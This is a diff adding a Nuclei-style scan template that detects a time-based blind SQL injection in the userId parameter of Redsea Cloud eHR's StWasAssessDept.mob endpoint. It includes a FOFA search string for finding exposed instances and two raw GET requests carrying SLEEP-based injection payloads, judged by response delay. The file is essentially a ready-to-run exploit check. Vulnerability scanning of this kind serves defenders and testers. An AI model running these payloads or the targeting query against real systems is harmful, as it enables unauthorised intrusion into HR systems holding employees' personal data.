@@ -1,0 +1,26 @@
+id: redsea-cloud-ehr-stwasassessdept-sqli
+info:
+  name: 红海云eHR StWasAssessDept.mob组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+  tags: 红海云eHR
+http:
+- raw:
+  - |
+    GET /RedseaPlatform/submitStWasAssessDept/StWasAssessDept.mob?userId='+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5)))ShXk)+AND+'qmyT'='qmyT HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+  - |
+    GET /RedseaPlatform/submitStWasAssessDept/StWasAssessDept.mob?userId='+AND+(SELECT+3266+FROM+(SELECT(SLEEP(8)))ShXk)+AND+'qmyT'='qmyT HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
